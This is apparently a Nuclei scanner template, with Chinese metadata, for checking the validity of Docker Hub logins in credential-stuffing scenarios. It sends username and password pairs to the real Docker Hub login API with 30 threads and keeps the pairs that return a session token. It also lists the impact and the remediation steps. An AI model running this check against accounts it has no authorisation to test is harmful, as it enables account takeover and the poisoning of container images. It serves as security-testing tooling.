id: docker-hub-login-check

info:
  name: Docker Hub 登录有效性检查（撞库）
  author: parthmalhotra,pdresearch
  severity: critical
  description: Docker Hub 是容器镜像托管与分发平台，账号可能拥有私有仓库、组织镜像和发布权限。该模板向 Docker Hub 登录接口提交用户名和密码，结合响应体中的 token 字段、响应头中的 token Cookie 以及 200 状态码判断给定凭据是否有效，可用于撞库场景下验证 Docker Hub 账户可登录性。
  impact: |-
    - 攻击者可使用有效凭据访问私有镜像仓库、组织项目和镜像元数据。
    - 若账号具备推送权限，可能篡改镜像、发布恶意镜像或影响依赖该仓库的构建与部署流程。
    - 被接管账号中的访问令牌和组织权限可能被继续利用，扩大供应链攻击范围。
  remediation: |-
    - 重置命中账号密码，撤销异常会话、访问令牌和可疑 Personal Access Token。
    - 为 Docker Hub 启用多因素认证，组织成员使用唯一强密码并避免跨站复用。
    - 审计近期镜像推送、仓库权限、组织成员和自动化构建配置，回滚可疑变更。
    - 对登录和镜像发布行为配置异常告警，并限制高权限账号的日常使用。
  reference:
    - https://owasp.org/www-community/attacks/Credential_stuffing
  metadata:
    max-request: 1
  tags: creds-stuffing,login-check,cloud,docker,vuln

self-contained: true

http:
  - raw:
      - |
        POST https://hub.docker.com/v2/users/login HTTP/1.1
        Host: hub.docker.com
        Content-Type: application/json

        {
          "username": "{{username}}",
          "password": "{{password}}"
        }

    threads: 30
    attack: pitchfork

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'token'

      - type: word
        part: header
        words:
          - 'Set-Cookie: token='

      - type: status
        status:
          - 200

    extractors:
      - type: dsl
        dsl:
          - username
          - password
